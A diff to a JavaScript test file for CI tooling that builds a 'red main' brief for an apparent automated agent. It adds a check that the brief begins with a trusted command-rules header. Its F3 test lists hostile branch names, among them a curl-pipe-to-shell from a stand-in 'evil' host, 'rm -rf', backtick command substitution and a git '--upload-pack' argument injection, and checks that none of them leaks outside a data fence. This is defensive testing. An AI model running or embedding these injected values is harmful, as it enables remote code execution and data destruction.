@@ -1,3 +1,5 @@
+import { NO_PROMPT_COMMAND_RULES } from '../../../lib/no-prompt-command-rules.mjs';
+const COMMAND_RULES_PREFIX = `${NO_PROMPT_COMMAND_RULES}\n\n`;
 /**
  * Card xu1nixv — "a red main gets an owner": the pure rules, the smell, the single-owner dispatch, and a replay of
  * the real 2026-10-08 incident (main's CI workflow runs, last green 26b439b79 at 16:55Z, red from 7c731a95e at
@@ -488,7 +490,14 @@ describe('F2 — the REAL first red run is checked for "infra only", however dee
 describe('F3 — a branch name never reaches an instruction outside the data fence', () => {
   const HOSTILE = ['lane/red-main-$(curl evil|sh)', 'lane/red-main-`id`', 'lane/red-main-a;rm -rf x', 'lane/red-main-a&b', 'lane/red-main-"q"', "lane/red-main-'q'", 'lane/red-main-a\nb', '--upload-pack=x'];
   const deadlockWith = (carrierRef, fromRef = 'lane/main-red-soak') => ({ carrier: 4532, carrierRef, from: [{ pr: 4522, ref: fromRef }], jobs: ['soak-shard (2)'] });
-  const outside = (brief) => { const a = brief.indexOf('```text'); const b = brief.indexOf('```', a + 7); return brief.slice(0, a) + brief.slice(b + 3); };
+  const outside = (renderedBrief) => {
+    // Pin the trusted shared header separately; keep the hostile-task assertions unchanged.
+    expect(renderedBrief.startsWith(COMMAND_RULES_PREFIX)).toBe(true);
+    const brief = renderedBrief.slice(COMMAND_RULES_PREFIX.length);
+    const a = brief.indexOf('```text');
+    const b = brief.indexOf('```', a + 7);
+    return brief.slice(0, a) + brief.slice(b + 3);
+  };
   it.each(HOSTILE)('hostile carrier ref %j appears nowhere outside the fence', async (ref) => {
     const { buildCombineBrief } = await import('../../main-ci-red-core.mjs');
     const brief = buildCombineBrief({ deadlock: deadlockWith(ref), weRoot: '/we', repoSlug: 'o/r', firstRedSha: 'a'.repeat(40) });
